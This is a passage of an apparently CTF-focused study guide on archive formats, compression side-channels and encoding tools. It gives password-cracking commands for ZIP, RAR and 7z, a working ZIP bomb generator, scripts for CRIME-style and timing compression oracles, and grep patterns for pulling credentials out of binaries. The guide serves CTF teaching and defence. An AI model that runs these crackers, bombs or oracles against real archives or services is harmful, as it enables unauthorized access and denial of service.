        # Check encryption
        for info in zf.infolist():
            if info.flag_bits & 0x01:
                print(f"[+] {info.filename} is encrypted")
            else:
                print(f"[-] {info.filename} is NOT encrypted")
    
    # Use pkcrack tool (external)
    print("\n[*] Use pkcrack for known-plaintext attack:")
    print(f"    pkcrack -C {encrypted_zip} -c target_file.txt \\")
    print(f"            -P {known_plaintext_file} -p plaintext.txt \\")
    print(f"            -d {output_zip}")
    print("\n[*] Or use bkcrack (modern tool):")
    print(f"    bkcrack -C {encrypted_zip} -c target_file.txt \\")
    print(f"            -p {known_plaintext_file}")

# Example
# zip_known_plaintext_attack('encrypted.zip', 'known.zip', 'decrypted.zip')
```

**ZIP bomb detection and creation:**

```python
#!/usr/bin/env python3

def detect_zip_bomb(filepath, max_ratio=1000, max_size=10*1024*1024*1024):
    """
    Detect potential ZIP bomb (decompression bomb)
    
    Characteristics:
    - Very high compression ratio
    - Nested archives
    - Extremely large uncompressed size
    """
    print("ZIP Bomb Detection")
    print("=" * 60)
    
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            total_compressed = 0
            total_uncompressed = 0
            suspicious = False
            
            for info in zf.infolist():
                total_compressed += info.compress_size
                total_uncompressed += info.file_size
                
                # Check individual file ratio
                if info.file_size > 0:
                    ratio = info.file_size / max(info.compress_size, 1)
                    
                    if ratio > max_ratio:
                        print(f"[!] SUSPICIOUS: {info.filename}")
                        print(f"    Compression ratio: {ratio:.0f}:1")
                        suspicious = True
                
                # Check for nested archives
                if info.filename.endswith(('.zip', '.gz', '.bz2', '.xz')):
                    print(f"[!] Nested archive detected: {info.filename}")
                    suspicious = True
                
                # Check enormous uncompressed size
                if info.file_size > max_size:
                    print(f"[!] Extremely large file: {info.filename}")
                    print(f"    Uncompressed: {info.file_size / (1024**3):.2f} GB")
                    suspicious = True
            
            overall_ratio = total_uncompressed / max(total_compressed, 1)
            
            print(f"\nOverall Statistics:")
            print(f"  Compressed: {total_compressed / 1024:.2f} KB")
            print(f"  Uncompressed: {total_uncompressed / (1024**2):.2f} MB")
            print(f"  Ratio: {overall_ratio:.0f}:1")
            
            if overall_ratio > max_ratio:
                print(f"\n[!] WARNING: Possible ZIP BOMB!")
                suspicious = True
            
            if not suspicious:
                print(f"\n[+] Archive appears safe")
            
            return suspicious
    
    except Exception as e:
        print(f"[!] Error analyzing ZIP: {e}")
        return True  # Assume suspicious on error

# detect_zip_bomb('suspicious.zip')
```

**Create ZIP bomb (educational):**

```python
#!/usr/bin/env python3

def create_zip_bomb(output_file='zipbomb.zip', layers=3, base_size=1024*1024):
    """
    Create nested ZIP bomb for testing
    
    [Unverified] Use only for educational purposes and authorized testing
    """
    print("Creating ZIP bomb (educational demonstration)")
    print("=" * 60)
    
    import io
    
    # Create base file (highly compressible)
    base_data = b'\x00' * base_size
    
    current_data = base_data
    
    for layer in range(layers):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f'layer_{layer}.dat', current_data)
        
        current_data = buffer.getvalue()
        
        print(f"Layer {layer}: {len(current_data)} bytes compressed")
    
    # Write final archive
    with open(output_file, 'wb') as f:
        f.write(current_data)
    
    print(f"\n[+] Created {output_file}")
    print(f"    Size: {len(current_data)} bytes")
    print(f"    Expands to: ~{base_size * (10 ** layers)} bytes")

# create_zip_bomb('test_bomb.zip', layers=2, base_size=1024*100)
```

#### RAR Format

RAR offers good compression and recovery records, commonly password-protected in CTFs.

**Basic operations:**

```bash
# Extraction (unrar must be installed)
unrar x archive.rar
unrar e archive.rar               # Extract without paths
unrar l archive.rar               # List contents
unrar t archive.rar               # Test integrity

# With password
unrar x -pPASSWORD archive.rar

# Extract with recovery
unrar x -kb archive.rar           # Keep broken files
```

**RAR password cracking:**

```bash
# rarcrack (slow, brute force)
rarcrack archive.rar --threads 4

# John the Ripper
rar2john archive.rar > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 12500 for RAR3, 13000 for RAR5)
hashcat -m 13000 -a 0 hash.txt rockyou.txt

# cRARk (GPU-accelerated)
crark -c -l4 -g8 archive.rar
```

**RAR structure analysis:**

```python
#!/usr/bin/env python3
import struct

def analyze_rar(filepath):
    """
    Parse RAR archive structure
    
    [Inference] RAR format is proprietary, analysis limited
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("RAR FILE ANALYSIS")
    print("=" * 60)
    
    # Check RAR signature
    if data.startswith(b'Rar!\x1a\x07\x00'):
        print("[+] RAR 1.5 - 4.x format detected")
        version = "RAR 1.5-4.x"
    elif data.startswith(b'Rar!\x1a\x07\x01\x00'):
        print("[+] RAR 5.0+ format detected")
        version = "RAR 5.0+"
    else:
        print(f"[!] Unknown RAR signature: {data[:8].hex()}")
        return
    
    print(f"  Version: {version}")
    
    # Parse blocks
    offset = 7 if version == "RAR 1.5-4.x" else 8
    block_num = 0
    
    while offset < len(data) - 7:
        if offset + 7 > len(data):
            break
        
        # Block header
        crc = struct.unpack('<H', data[offset:offset+2])[0]
        block_type = data[offset+2]
        flags = struct.unpack('<H', data[offset+3:offset+5])[0]
        size = struct.unpack('<H', data[offset+5:offset+7])[0]
        
        block_num += 1
        
        block_types = {
            0x72: "Marker",
            0x73: "Archive header",
            0x74: "File header",
            0x75: "Comment",
            0x76: "Extra info",
            0x77: "Subblock",
            0x78: "Recovery record",
            0x79: "Archive authenticity",
            0x7a: "New-style subblock",
            0x7b: "End of archive"
        }
        
        type_name = block_types.get(block_type, f"Unknown (0x{block_type:02x})")
        
        print(f"\nBlock #{block_num} at offset 0x{offset:x}:")
        print(f"  Type: {type_name}")
        print(f"  CRC: 0x{crc:04x}")
        print(f"  Flags: 0x{flags:04x}")
        print(f"  Size: {size} bytes")
        
        # File header details
        if block_type == 0x74:
            if offset + size <= len(data):
                # Extract filename
                name_offset = offset + 25  # Approximate, varies by version
                name_end = data.find(b'\x00', name_offset, offset + size)
                if name_end > name_offset:
                    filename = data[name_offset:name_end].decode('utf-8', errors='ignore')
                    print(f"  Filename: {filename}")
                
                # Check encryption flag
                if flags & 0x04:
                    print(f"  [!] ENCRYPTED")
        
        # End of archive
        if block_type == 0x7b:
            print("\n[+] End of archive marker found")
            break
        
        offset += size
        
        # Safety check
        if block_num > 1000:
            print("\n[!] Too many blocks, stopping analysis")
            break
    
    print(f"\nTotal blocks: {block_num}")

# analyze_rar('archive.rar')
```

**RAR recovery:**

```bash
# Extract with recovery volumes
unrar x archive.part1.rar

# Repair damaged archive (requires recovery record)
unrar r archive.rar

# Reconstruct from recovery volumes
unrar rc archive.rar
```

#### 7z Format

7z offers excellent compression ratio with LZMA/LZMA2, supports strong encryption.

**Basic operations:**

```bash
# Creation
7z a archive.7z file1.txt file2.txt
7z a -mx=9 archive.7z files/        # Maximum compression
7z a -p archive.7z files/           # Prompt for password
7z a -pPASSWORD -mhe archive.7z files/  # Encrypt headers too

# Extraction
7z x archive.7z
7z e archive.7z                     # Extract without paths
7z l archive.7z                     # List contents
7z t archive.7z                     # Test integrity

# With password
7z x -pPASSWORD archive.7z
```

**7z password cracking:**

```bash
# John the Ripper
7z2john archive.7z > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat (mode 11600)
hashcat -m 11600 -a 0 hash.txt rockyou.txt

# 7z-cracker (Python)
python3 7z-cracker.py -f archive.7z -w rockyou.txt
```

**7z structure analysis:**

```python
#!/usr/bin/env python3
import struct
import lzma

def analyze_7z(filepath):
    """
    Parse 7z archive structure
    """
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print("=" * 60)
    print("7Z FILE ANALYSIS")
    print("=" * 60)
    
    # Check signature
    if not data.startswith(b'7z\xbc\xaf\x27\x1c'):
        print(f"[!] Invalid 7z signature: {data[:6].hex()}")
        return
    
    print("[+] Valid 7z signature")
    
    # Parse header
    major_version = data[6]
    minor_version = data[7]
    start_header_crc = struct.unpack('<I', data[8:12])[0]
    next_header_offset = struct.unpack('<Q', data[12:20])[0]
    next_header_size = struct.unpack('<Q', data[20:28])[0]
    next_header_crc = struct.unpack('<I', data[28:32])[0]
    
    print(f"\nHeader Information:")
    print(f"  Version: {major_version}.{minor_version}")
    print(f"  Start header CRC: 0x{start_header_crc:08x}")
    print(f"  Next header offset: {next_header_offset}")
    print(f"  Next header size: {next_header_size}")
    print(f"  Next header CRC: 0x{next_header_crc:08x}")
    
    # Try to extract using py7zr if available
    try:
        import py7zr
        
        with py7zr.SevenZipFile(filepath, 'r') as archive:
            file_list = archive.getnames()
            
            print(f"\nFiles in archive: {len(file_list)}")
            
            for name in file_list[:20]:  # Show first 20
                info = archive.list()
                print(f"  {name}")
                
                # Check for encryption
                if archive.needs_password():
                    print(f"  [!] Archive is PASSWORD PROTECTED")
                    break
    
    except ImportError:
        print("\n[*] Install py7zr for detailed analysis: pip3 install py7zr")
    except Exception as e:
        print(f"\n[!] Error: {e}")

# analyze_7z('archive.7z')
```

### Compression-based Attacks

Compression can leak information about encrypted/unknown data through compression ratios and timing.

#### CRIME/BREACH Attack (Compression Information Leakage)

These attacks exploit compression side-channels in HTTPS to extract secrets.

**CRIME attack concept:**

```python
#!/usr/bin/env python3

def demonstrate_crime_attack(secret, attacker_controlled, alphabet="abcdefghijklmnopqrstuvwxyz"):
    """
    Demonstrate CRIME attack principle
    
    When compression is applied before encryption:
    1. Attacker injects guesses into plaintext
    2. Correct guesses compress better (repeated data)
    3. Shorter ciphertext = correct guess
    
    [Inference] Real CRIME attack much more complex
    """
    print("CRIME Attack Demonstration")
    print("=" * 60)
    print(f"Secret to extract: {secret}")
    print(f"Attacker can inject: {attacker_controlled}")
    print()
    
    import zlib
    
    recovered = ""
    
    for position in range(len(secret)):
        best_char = None
        best_size = float('inf')
        
        print(f"Position {position}:")
        
        for guess_char in alphabet:
            # Construct payload: known prefix + guess + attacker padding
            guess = recovered + guess_char
            payload = f"{attacker_controlled}{guess}|||{secret}"
            
            # Compress (simulates compression before encryption)
            compressed = zlib.compress(payload.encode())
            size = len(compressed)
            
            if size < best_size:
                best_size = size
                best_char = guess_char
            
            # Show some attempts
            if guess_char in secret[position:position+3]:
                print(f"  '{guess_char}': {size} bytes", end="")
                if guess_char == secret[position]:
                    print(" <- BEST (correct!)")
                else:
                    print()
        
        recovered += best_char
        print(f"  Recovered so far: {recovered}\n")
    
    print(f"Final recovered: {recovered}")
    print(f"Success: {recovered == secret}")
    
    return recovered

# Example
demonstrate_crime_attack(
    secret="sessionid=abc123",
    attacker_controlled="Cookie: sessionid=",
    alphabet="abcdefghijklmnopqrstuvwxyz0123456789="
)
```

**BREACH mitigation detection:**

```python
#!/usr/bin/env python3

def test_compression_side_channel(oracle, secret_prefix="flag{", charset="abcdefghijklmnopqrstuvwxyz0123456789_}"):
    """
    Test if service is vulnerable to compression side-channel
    
    oracle: function that takes input and returns compressed output size
    """
    print("Testing Compression Side-Channel Vulnerability")
    print("=" * 60)
    
    # Test baseline
    baseline = oracle("A" * 100)
    
    # Test with repeated content
    repeated = oracle((secret_prefix * 10))
    
    print(f"Baseline (random): {baseline} bytes")
    print(f"Repeated pattern: {repeated} bytes")
    
    compression_ratio = baseline / repeated
    
    if compression_ratio > 1.5:
        print(f"\n[!] VULNERABLE: High compression ratio ({compression_ratio:.2f})")
        print("    Service may leak information through compression")
        return True
    else:
        print(f"\n[+] Low compression ratio ({compression_ratio:.2f})")
        print("    Less likely to be exploitable")
        return False

# Example oracle (simulated)
def example_oracle(data):
    import gzip
    return len(gzip.compress(data.encode()))

# test_compression_side_channel(example_oracle)
```

#### Compression Ratio Analysis

**Entropy-based detection:**

```python
#!/usr/bin/env python3
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    if len(data) == 0:
        return 0
    
    counter = Counter(data)
    entropy = 0
    
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    
    return entropy

def analyze_compression_potential(filepath):
    """
    Analyze file's compression potential before compressing
    High entropy = poor compression
    Low entropy = good compression
    """
    print("Compression Potential Analysis")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Calculate entropy
    entropy = calculate_entropy(data)
    max_entropy = 8.0  # For bytes
    
    print(f"File size: {len(data)} bytes")
    print(f"Entropy: {entropy:.4f} bits/byte")
    print(f"Max entropy: {max_entropy:.4f} bits/byte")
    print(f"Entropy ratio: {(entropy/max_entropy)*100:.1f}%")
    
    # Predict compression
    if entropy > 7.5:
        print("\n[*] HIGH ENTROPY - Poor compression expected")
        print("    File may be encrypted, compressed, or random")
    elif entropy > 6.0:
        print("\n[*] MEDIUM ENTROPY - Moderate compression possible")
    else:
        print("\n[*] LOW ENTROPY - Good compression expected")
        print("    File contains redundancy/patterns")
    
    # Test actual compression
    import gzip
    import bz2
    import lzma
    
    print(f"\nActual Compression Results:")
    
    gzip_size = len(gzip.compress(data))
    gzip_ratio = len(data) / gzip_size
    print(f"  GZIP:  {gzip_size} bytes ({gzip_ratio:.2f}:1)")
    
    bz2_size = len(bz2.compress(data))
    bz2_ratio = len(data) / bz2_size
    print(f"  BZIP2: {bz2_size} bytes ({bz2_ratio:.2f}:1)")
    
    lzma_size = len(lzma.compress(data))
    lzma_ratio = len(data) / lzma_size
    print(f"  LZMA:  {lzma_size} bytes ({lzma_ratio:.2f}:1)")
    
    return entropy, gzip_ratio

# analyze_compression_potential('testfile.txt')
```

#### Steganography in Compressed Files

**Detecting hidden data in compressed archives:**

```python
#!/usr/bin/env python3

def detect_steganography_in_zip(filepath):
    """
    Detect potential steganography in ZIP files
    
    Indicators:
    - Extra data after archive
    - Unusual compression ratios
    - Encrypted files with low entropy
    - Comments containing data
    """
    print("ZIP Steganography Detection")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    suspicious_indicators = []
    
    # Check for data after End of Central Directory
    eocd_signature = b'\x50\x4b\x05\x06'
    eocd_pos = data.rfind(eocd_signature)
    
    if eocd_pos != -1:
        # EOCD found, check if data follows
        eocd_size = 22  # Minimum EOCD size
        
        # Parse comment length
        if eocd_pos + 20 < len(data):
            comment_len = struct.unpack('<H', data[eocd_pos+20:eocd_pos+22])[0]
            expected_end = eocd_pos + eocd_size + comment_len
            
            if expected_end < len(data):
                extra_bytes = len(data) - expected_end
                print(f"[!] Extra data after archive: {extra_bytes} bytes")
                suspicious_indicators.append("Extra data appended")
                
                # Show preview of extra data
                extra_data = data[expected_end:expected_end+100]
                print(f"    Preview: {extra_data[:50]}")
    
    # Analyze with zipfile
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            for info in zf.infolist():
                # Check comment
                if info.comment:
                    print(f"\n[*] File comment found: {info.filename}")
                    print(f"    Comment: {info.comment[:100]}")
                    suspicious_indicators.append("File has comment")
                
                # Check for 0% compression (stored mode with encryption)
                if info.compress_type == 0 and (info.flag_bits & 0x01):
                    print(f"\n[!] Encrypted but uncompressed: {info.filename}")
                    suspicious_indicators.append("Encrypted without compression")
                
                # Check unusual compression ratios
                if info.file_size > 0:
                    ratio = info.compress_size / info.file_size
                    if ratio > 0.99 and info.compress_type != 0:
                        print(f"\n[!] Poor compression ratio: {info.filename}")
                        print(f"    Ratio: {ratio:.2%} (expected much lower)")
                        suspicious_indicators.append("Anomalous compression ratio")
    
    except Exception as e:
        print(f"\n[!] Error reading ZIP: {e}")
    
    # Summary
    print(f"\n{'='*60}")
    if suspicious_indicators:
        print(f"[!] SUSPICIOUS - {len(suspicious_indicators)} indicators:")
        for indicator in suspicious_indicators:
            print(f"    - {indicator}")
    else:
        print(f"[+] No obvious steganography indicators found")
    
    return len(suspicious_indicators) > 0

# detect_steganography_in_zip('suspicious.zip')
```

**Extracting appended data:**

```bash
#!/bin/bash
# Extract data appended to ZIP file

ZIPFILE="$1"

# Find End of Central Directory
EOCD_OFFSET=$(grep -abo $'\x50\x4b\x05\x06' "$ZIPFILE" | tail -1 | cut -d: -f1)

if [ -n "$EOCD_OFFSET" ]; then
    echo "EOCD found at offset: $EOCD_OFFSET"
    
    # Calculate expected end (EOCD is 22 bytes minimum)
    EXPECTED_END=$((EOCD_OFFSET + 22))
    ACTUAL_SIZE=$(stat -f%z "$ZIPFILE" 2>/dev/null || stat -c%s "$ZIPFILE")
    
    if [ $ACTUAL_SIZE -gt $EXPECTED_END ]; then
        EXTRA_BYTES=$((ACTUAL_SIZE - EXPECTED_END))
        echo "Extra data detected: $EXTRA_BYTES bytes"
        
        # Extract extra data
        dd if="$ZIPFILE" bs=1 skip=$EXPECTED_END of=extracted_data.bin
        
        echo "Extracted to: extracted_data.bin"
        file extracted_data.bin
    else
        echo "No extra data found"
    fi
fi
```

#### Timing Attacks on Compression

**Timing-based compression oracle:**

```python
#!/usr/bin/env python3
import time
import zlib

def compression_timing_attack(oracle, target_string, charset="abcdefghijklmnopqrstuvwxyz"):
    """
    Extract secret using compression timing side-channel
    
    Correct guesses compress faster (less CPU time)
    
    [Inference] Requires precise timing measurements
    [Unverified] Success depends on environment noise
    """
    print("Compression Timing Attack")
    print("=" * 60)
    
    recovered = ""
    
    for position in range(len(target_string)):
        timings = {}
        
        print(f"\nTesting position {position}:")
        
        # Measure timing for each character
        for char in charset:
            guess = recovered + char
            
            # Multiple trials for accuracy
            trials = []
            for _ in range(10):
                start = time.perf_counter()
                _ = oracle(guess)
                elapsed = time.perf_counter() - start
                trials.append(elapsed)
            
            # Use median to reduce noise
            timings[char] = sorted(trials)[len(trials)//2]
        
        # Fastest = best guess (compresses quickest)
        best_char = min(timings, key=timings.get)
        recovered += best_char
        
        # Show top 3 candidates
        sorted_times = sorted(timings.items(), key=lambda x: x[1])
        print(f"  Top candidates:")
        for char, timing in sorted_times[:3]:
            marker = " <- SELECTED" if char == best_char else ""
            print(f"    '{char}': {timing*1000:.4f} ms{marker}")
        
        print(f"  Recovered: {recovered}")
    
    return recovered

# Example oracle (simulated - compresses known string + guess)
def timing_oracle(guess):
    secret = "secretdata"
    data = (secret + guess) * 100
    _ = zlib.compress(data.encode(), level=9)
    return True

# compression_timing_attack(timing_oracle, "secret", charset="abcdefghijklmnopqrstu")
```

### CTF-Specific Techniques

**Multi-layer decompression automation:**

```python
#!/usr/bin/env python3
import os
import subprocess

def recursive_decompress(filepath, max_depth=10):
    """
    Recursively decompress nested archives
    Common CTF pattern: file.gz.bz2.xz.tar.gz...
    """
    print("Recursive Decompression")
    print("=" * 60)
    
    current_file = filepath
    depth = 0
    
    while depth < max_depth:
        print(f"\nDepth {depth}: {os.path.basename(current_file)}")
        
        # Detect file type
        result = subprocess.run(['file', '-b', current_file], 
                              capture_output=True, text=True)
        file_type = result.stdout.strip().lower()
        
        print(f"  Type: {file_type}")
        
        # Determine decompression method
        if 'gzip' in file_type:
            output = current_file.rsplit('.gz', 1)[0] if current_file.endswith('.gz') else current_file + '.out'
            subprocess.run(['gunzip', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'bzip2' in file_type:
            output = current_file.rsplit('.bz2', 1)[0] if current_file.endswith('.bz2') else current_file + '.out'
            subprocess.run(['bunzip2', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'xz' in file_type or 'lzma' in file_type:
            output = current_file.rsplit('.xz', 1)[0] if current_file.endswith('.xz') else current_file + '.out'
            subprocess.run(['unxz', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'zip' in file_type:
            output_dir = current_file + '_extracted'
            os.makedirs(output_dir, exist_ok=True)
            subprocess.run(['unzip', '-q', current_file, '-d', output_dir])
            # Find extracted file
            files = os.listdir(output_dir)
            if files:
                current_file = os.path.join(output_dir, files[0])
            else:
                print("  [!] No files extracted")
                break
        
        elif 'rar' in file_type:
            output_dir = current_file + '_extracted'
            os.makedirs(output_dir, exist_ok=True)
            subprocess.run(['unrar', 'x', '-inul', current_file, output_dir])
            files = os.listdir(output_dir)
            if files:
                current_file = os.path.join(output_dir, files[0])
            else:
                break
        
        else:
            print(f"  [+] Final file reached (no compression detected)")
            break
        
        depth += 1
    
    print(f"\nFinal file: {current_file}")
    
    # Check if it's readable text or binary
    try:
        with open(current_file, 'r') as f:
            content = f.read(500)
            print(f"\nContent preview:\n{content}")
    except:
        print("\n[*] Binary file - check manually")
    
    return current_file

# recursive_decompress('nested.gz.bz2.xz')
```

**Archive format confusion:**

```python
#!/usr/bin/env python3

def detect_real_format(filepath):
    """
    Detect real file format regardless of extension
    Common CTF trick: .zip file is actually .gz, etc.
    """
    print("Real Format Detection")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        magic = f.read(16)
    
    formats = {
        b'\x1f\x8b': 'GZIP',
        b'BZh': 'BZIP2',
        b'\xfd7zXZ\x00': 'XZ',
        b'PK\x03\x04': 'ZIP',
        b'PK\x05\x06': 'ZIP (empty)',
        b'PK\x07\x08': 'ZIP (spanned)',
        b'Rar!\x1a\x07\x00': 'RAR 1.5-4.x',
        b'Rar!\x1a\x07\x01\x00': 'RAR 5.0+',
        b'7z\xbc\xaf\x27\x1c': '7Z',
        b'\x5d\x00\x00': 'LZMA',
    }
    
    detected = None
    for sig, fmt in formats.items():
        if magic.startswith(sig):
            detected = fmt
            break
    
    print(f"Filename: {os.path.basename(filepath)}")
    print(f"Extension: {os.path.splitext(filepath)[1]}")
    print(f"Magic bytes: {magic[:8].hex()}")
    print(f"Detected format: {detected or 'Unknown'}")
    
    # Suggest correct tool
    if detected:
        tools = {
            'GZIP': 'gunzip or gzip -d',
            'BZIP2': 'bunzip2 or bzip2 -d',
            'XZ': 'unxz or xz -d',
            'LZMA': 'unlzma or lzma -d',
            'ZIP': 'unzip',
            'RAR 1.5-4.x': 'unrar',
            'RAR 5.0+': 'unrar',
            '7Z': '7z x'
        }
        print(f"Recommended tool: {tools.get(detected, 'unknown')}")
    
    return detected

# detect_real_format('suspicious.zip')
```

### Important Related Topics

- **Zlib DEFLATE internals** (understanding compression for manipulation)
- **Archive password recovery techniques** (advanced cracking)
- **Polyglot files** (files valid as multiple formats)
- **ZIP64 format** (archives > 4GB)
- **DEFLATE bomb mitigation** (safe decompression practices)
- **Compression in network protocols** (HTTP, SSH, TLS)

---

## Tools

### CyberChef

CyberChef is a web-based utility for encoding, decoding, and analyzing data formats commonly encountered in CTF challenges. It supports 300+ operations and enables chaining multiple transformations.

##### Web Interface Usage

Access CyberChef at `https://gchq.github.io/CyberChef/` or deploy locally:

```bash
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm start
```

The interface consists of the recipe panel (left), input field (center-left), output field (center-right), and operations library (right). Drag operations from the library into the recipe to create transformation chains.

##### Common CTF Operations

Base64 decoding with automatic format detection:

Search for "Base64" in the operations panel. Drag into recipe. Paste encoded data into input. Output displays decoded content automatically. Use the "Auto Bake" toggle (top-left) to process input continuously as you edit.

Multiple encoding layers (base64 → hex → base64):

Add operations sequentially: `Base64 Decode` → `From Hex` → `Base64 Decode`. CyberChef processes data through the chain automatically.

ROT13 and Caesar cipher analysis:

Use "ROT13" for single rotation or "Caesar Cipher Brute Force" to test all 26 shifts simultaneously. The output panel displays all variants with their scores based on English language statistics.

Hash identification and cracking:

Drag "Analyse Hash" into recipe with suspected hash input. CyberChef identifies hash type (MD5, SHA1, SHA256, etc.). For weak hashes, use "Crack" operations if available, or check against known rainbow tables via integrated services.

Hexdump analysis:

Use "From Hex" to convert hexadecimal strings to readable text. Combine with "Detect Encoding" to identify character sets. For binary analysis, use "Hex Viewer" operation to display both hex and ASCII representations.

XOR operations:

Add "XOR" operation, specify key (hex or text), and apply. For unknown keys, use "XOR Brute Force" to test all single-byte keys or specify key length for multi-byte XOR attacks.

Regular expression extraction:

Use "Regular Expression" operation to find patterns matching flags (e.g., `flag\{[^}]+\}` or `CTF\{[A-Za-z0-9_]+\}`). Configure capture groups to extract specific portions.

##### Advanced Chaining

Create complex recipes for multi-stage encoding. Example: decompress gzip → decode base64 → extract strings → regex match:

1. Add "Gunzip" operation
2. Add "Base64 Decode"
3. Add "Strings" operation
4. Add "Regular Expression" with pattern `flag\{.*?\}`
5. Enable "Auto Bake"

Save recipes for reuse:

Click the bookmark icon next to "Save Recipe" (top toolbar). Name and share the recipe URL. Other users can load your saved recipe by URL, enabling collaborative CTF work.

##### Limitations and Workarounds

CyberChef operates entirely in-browser, which limits memory for processing large files (>100MB). For large datasets, use command-line tools instead. Export CyberChef output and process locally with `bash` or `python` scripts.

Some operations require specific input formats. If an operation fails silently, verify input encoding using "Detect Encoding" first.

### `base64` Command

The `base64` command encodes and decodes Base64 data at the command line. It's essential for quick encoding/decoding in CTF scenarios without GUI overhead.

##### Basic Encoding and Decoding

Encode plain text:

```bash
echo "FLAG{example}" | base64
```

Output: `RkxBR3tleGFtcGxlfQ==`

Decode Base64:

```bash
echo "RkxBR3tleGFtcGxlfQ==" | base64 -d
```

Output: `FLAG{example}`

Decode from file:

```bash
base64 -d encoded.txt > decoded.txt
```

##### Multi-Layer Decoding

Chain multiple decoding operations:

```bash
cat encoded.txt | base64 -d | base64 -d | base64 -d
```

Create a loop for iterative decoding until output stabilizes (useful for unknown encoding depth):

```bash
#!/bin/bash
input=$(cat encoded.txt)
iteration=0
while true; do
  output=$(echo "$input" | base64 -d 2>/dev/null)
  if [ "$?" -ne 0 ]; then
    echo "Final output (iteration $iteration):"
    echo "$input"
    break
  fi
  echo "Iteration $((++iteration)): $output"
  input="$output"
done
```

This script attempts repeated base64 decoding, printing each iteration. It stops when decoding fails or content doesn't change.

##### Encoding with Line Wrapping

Control output line length:

```bash
base64 -w 0 plaintext.txt
```

The `-w 0` option removes line wrapping (default is 76 characters per line). Useful for embedding encoded data in single-line contexts.

##### Binary File Encoding

Encode binary files:

```bash
base64 < archive.zip > archive.zip.b64
base64 -d < archive.zip.b64 > archive.zip
```

Verify integrity after decoding:

```bash
md5sum archive.zip archive.zip.decoded
```

Both checksums should match.

##### Detecting Base64 Obfuscation

Test if data is base64-encoded (valid base64 alphabet is `A-Z`, `a-z`, `0-9`, `+/=`):

```bash
echo "RkxBR3tleGFtcGxlfQ==" | grep -E '^[A-Za-z0-9+/]*={0,2}$'
```

If grep matches, the data is valid base64. Pipe through `base64 -d` to verify:

```bash
echo "RkxBR3tleGFtcGxlfQ==" | base64 -d && echo "Valid base64" || echo "Invalid base64"
```

### `xxd` (Hex)

The `xxd` command converts data to hexadecimal and vice versa, enabling analysis of binary files, embedded data, and obfuscated content.

##### Basic Hex Dump

Display file in hexadecimal format:

```bash
xxd binary_file
```

Output format: address, 16 bytes of hex, ASCII interpretation. Each line shows 16 bytes (customizable with `-c` option):

```bash
xxd -c 8 binary_file
```

Shows 8 bytes per line for tighter display.

##### Reverse Hex to Binary

Convert hex dump back to binary:

```bash
xxd -r hex_dump.txt > binary_file
```

The `-r` option reverses the hex dump. Useful for extracting hex-encoded payloads and reconstructing files.

##### Selective Hex Dumping

Extract specific byte ranges:

```bash
xxd -s 0x100 -l 256 binary_file
```

`-s 0x100` starts at offset 256 (hex), `-l 256` limits output to 256 bytes. Useful for examining file headers or specific structures.

For dynamic offset calculation:

```bash
offset=$((0x1000))
xxd -s $offset -l 512 binary_file
```

##### Hex String Conversion

Convert between hex strings and text:

```bash
echo -n "FLAG{test}" | xxd -p
```

Output: `464c41477b74657374207d` (no spaces, lowercase hex)

Reverse conversion:

```bash
echo "464c41477b74657374207d" | xxd -r -p
```

Output: `FLAG{test}`

The `-p` option enables "plain" mode (no address or ASCII column), producing raw hex output suitable for piping.

##### Identifying Binary Signatures

Compare file headers against known signatures:

```bash
xxd -l 32 suspected_zip.bin
```

Common signatures:

- ZIP: `50 4b 03 04` (PK..)
- PNG: `89 50 4e 47` (.PNG)
- JPEG: `ff d8 ff e0` (...)
- ELF: `7f 45 4c 46` (.ELF)
- PDF: `25 50 44 46` (%PDF)

If the header doesn't match, the file may be corrupted, encrypted, or misidentified.

##### Comparing Files

Identify differences between two files:

```bash
diff <(xxd file1) <(xxd file2)
```

Process substitution displays hex dumps side-by-side. Highlighted lines show bytes that differ.

##### Inserting Hex Patches

Create binary patches by modifying hex dumps:

```bash
xxd binary_file > hex_dump.txt
# Edit hex_dump.txt manually, changing hex values
xxd -r hex_dump.txt > patched_binary
```

Example: Change byte at offset 0x10 from `41` (A) to `42` (B):

1. Run `xxd binary_file > hex_dump.txt`
2. Find the line containing offset 0x10
3. Change `41` to `42` in that line
4. Run `xxd -r hex_dump.txt > patched_binary`

### `strings` Command

The `strings` command extracts readable ASCII and Unicode strings from binary files, revealing embedded text, credentials, flags, or code.

##### Basic String Extraction

Extract all strings longer than 4 characters (default):

```bash
strings binary_file
```

Change minimum length:

```bash
strings -n 10 binary_file
```

This outputs only strings with at least 10 characters, reducing noise.

##### Filtering Strings

Grep output for relevant patterns:

```bash
strings binary_file | grep -i flag
strings binary_file | grep -E '^[A-Za-z0-9]{32}$'
```

The first command searches case-insensitively for "flag". The second matches 32-character hex strings (common for MD5 hashes).

Search for credentials:

```bash
strings binary_file | grep -E '(password|pwd|pass|secret|key|token)='
strings binary_file | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
```

The first pattern matches common credential assignments. The second extracts email addresses.

##### Unicode String Extraction

Extract Unicode (UTF-16) strings commonly found in Windows binaries:

```bash
strings -e l binary_file
```

The `-e l` option (little-endian Unicode) extracts UTF-16LE strings. For big-endian:

```bash
strings -e b binary_file
```

Combine with grep:

```bash
strings -e l binary_file | grep -i flag
```

##### File Offset Tracking

Display byte offset of each string:

```bash
strings -t x binary_file
```

The `-t x` option shows offsets in hexadecimal. Use `-t d` for decimal or `-t o` for octal. Offsets enable targeted hex editing or payload extraction.

Example output:

```
      0x1000 FLAG{example}
      0x1010 password123
```

